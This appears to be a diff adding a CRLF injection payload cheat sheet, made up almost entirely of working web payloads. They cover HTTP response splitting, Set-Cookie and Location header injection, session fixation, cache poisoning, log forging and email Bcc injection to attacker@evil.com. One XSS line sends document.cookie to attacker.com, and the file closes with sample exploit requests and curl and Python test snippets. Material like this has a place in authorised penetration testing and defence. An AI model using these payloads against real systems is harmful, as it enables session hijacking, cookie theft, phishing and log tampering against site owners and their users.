@@ -1,0 +1,235 @@
+# CRLF Injection Payloads
+
+## ========================================
+## BASIC CRLF INJECTION
+## ========================================
+
+# Carriage Return + Line Feed
+%0D%0A
+%0d%0a
+\r\n
+\r\n\r\n
+
+# URL encoded variations
+%0D%0A%0D%0A
+%0d%0a%0d%0a
+%0A%0D
+%0a%0d
+
+## ========================================
+## HTTP RESPONSE SPLITTING
+## ========================================
+
+# Inject new headers
+%0D%0ASet-Cookie:%20admin=true
+%0D%0ALocation:%20http://attacker.com
+
+# Inject HTML content
+%0D%0A%0D%0A<html><body><script>alert(1)</script></body></html>
+
+# Full response splitting
+%0D%0AContent-Length:%200%0D%0A%0D%0AHTTP/1.1%20200%20OK%0D%0AContent-Type:%20text/html%0D%0AContent-Length:%2025%0D%0A%0D%0A<html>Injected</html>
+
+## ========================================
+## HEADER INJECTION
+## ========================================
+
+# Set-Cookie injection
+%0D%0ASet-Cookie: sessionid=malicious; Path=/; HttpOnly
+
+# Content-Type injection
+%0D%0AContent-Type: text/html
+
+# Location header injection
+%0D%0ALocation: http://attacker.com
+
+# Custom headers
+%0D%0AX-Injected-Header: malicious
+
+## ========================================
+## XSS VIA CRLF
+## ========================================
+
+# Basic XSS
+%0D%0A%0D%0A<script>alert(document.domain)</script>
+
+# With Content-Type
+%0D%0AContent-Type: text/html%0D%0A%0D%0A<script>alert(1)</script>
+
+# Cookie stealing
+%0D%0A%0D%0A<script>document.location='http://attacker.com/?c='+document.cookie</script>
+
+## ========================================
+## CACHE POISONING
+## ========================================
+
+# Inject malicious content
+%0D%0AContent-Length:%200%0D%0A%0D%0AHTTP/1.1%20200%20OK%0D%0AContent-Type:%20text/html%0D%0A%0D%0A<script>alert('Cached')</script>
+
+## ========================================
+## SESSION FIXATION
+## ========================================
+
+# Fix session cookie
+%0D%0ASet-Cookie: PHPSESSID=attacker_session_id
+
+# With domain
+%0D%0ASet-Cookie: sessionid=fixed; Domain=.target.com; Path=/
+
+## ========================================
+## REDIRECT TO ATTACKER SITE
+## ========================================
+
+# Using Location header
+%0D%0ALocation:%20http://attacker.com
+%0d%0aLocation:%20http://attacker.com
+
+# With JavaScript redirect
+%0D%0A%0D%0A<script>window.location='http://attacker.com'</script>
+
+## ========================================
+## ENCODING VARIATIONS
+## ========================================
+
+# Standard encoding
+%0D%0A
+%0d%0a
+
+# Double encoding
+%250D%250A
+%250d%250a
+
+# Unicode encoding
+%E5%98%8A%E5%98%8D
+\u000d\u000a
+
+# UTF-8 encoding
+%C4%8D%C4%8A
+
+# Mixed encoding
+%0D%0a
+%0d%0A
+
+## ========================================
+## BYPASS TECHNIQUES
+## ========================================
+
+# Null byte
+%00%0D%0A
+
+# Space before CRLF
+%20%0D%0A
+
+# Tab before CRLF
+%09%0D%0A
+
+# Multiple encodings
+%0D%0A%0D%0A%0D%0A
+
+## ========================================
+## LOG INJECTION
+## ========================================
+
+# Inject into logs
+admin%0D%0AFake log entry: [INFO] User login successful
+
+# Multi-line injection
+user%0D%0A[ERROR] Fake error%0D%0A[INFO] Fake info
+
+## ========================================
+## EMAIL HEADER INJECTION
+## ========================================
+
+# Inject BCC
+%0D%0ABcc: attacker@evil.com
+
+# Inject CC
+%0D%0ACc: attacker@evil.com
+
+# Inject additional recipients
+victim@target.com%0D%0ABcc: attacker@evil.com
+
+# Change subject
+%0D%0ASubject: Phishing Email
+
+# Full email injection
+to@victim.com%0D%0ABcc: attacker@evil.com%0D%0ASubject: Malicious%0D%0A%0D%0AEmail body
+
+## ========================================
+## SPECIFIC INJECTION POINTS
+## ========================================
+
+# URL parameter
+?redirect=http://target.com%0D%0ASet-Cookie: admin=true
+
+# Referer header
+Referer: http://attacker.com%0D%0ASet-Cookie: malicious=true
+
+# User-Agent
+User-Agent: Mozilla/5.0%0D%0AX-Injected: true
+
+# Cookie value
+Cookie: session=value%0D%0ASet-Cookie: admin=true
+
+## ========================================
+## ADVANCED PAYLOADS
+## ========================================
+
+# Complete response injection
+%0D%0A%0D%0AHTTP/1.1%20200%20OK%0D%0AContent-Type:%20text/html%0D%0AContent-Length:%2050%0D%0A%0D%0A<html><body>Injected Response</body></html>
+
+# Multiple header injection
+%0D%0AX-Header1: value1%0D%0AX-Header2: value2%0D%0AX-Header3: value3
+
+## ========================================
+## EXPLOITATION EXAMPLES
+## ========================================
+
+# Example 1: Cookie injection
+GET /?redirect=http://example.com%0D%0ASet-Cookie:%20admin=true HTTP/1.1
+Host: target.com
+
+# Example 2: XSS via CRLF
+GET /?page=home%0D%0AContent-Length:%200%0D%0A%0D%0AHTTP/1.1%20200%20OK%0D%0A%0D%0A<script>alert(1)</script> HTTP/1.1
+Host: target.com
+
+# Example 3: Open redirect
+GET /?url=http://target.com%0D%0ALocation:%20http://attacker.com HTTP/1.1
+Host: target.com
+
+## ========================================
+## TESTING METHODOLOGY
+## ========================================
+
+# 1. Identify injection points (headers, redirects, logs)
+# 2. Test basic CRLF: %0D%0A
+# 3. Try header injection
+# 4. Attempt response splitting
+# 5. Test for XSS
+# 6. Try cache poisoning
+
+## ========================================
+## DETECTION PATTERNS
+## ========================================
+
+# Look for CRLF in responses
+\r\n
+%0D%0A
+Set-Cookie appearing twice
+Multiple Location headers
+
+## ========================================
+## TOOLS
+## ========================================
+
+# Burp Suite Collaborator
+# Use to detect out-of-band CRLF
+
+# curl
+curl -v "http://target.com/?redirect=http://example.com%0D%0ASet-Cookie:%20test=value"
+
+# Python
+import requests
+url = "http://target.com/?param=value%0D%0ASet-Cookie:%20admin=true"
+r = requests.get(url)
+print(r.headers)
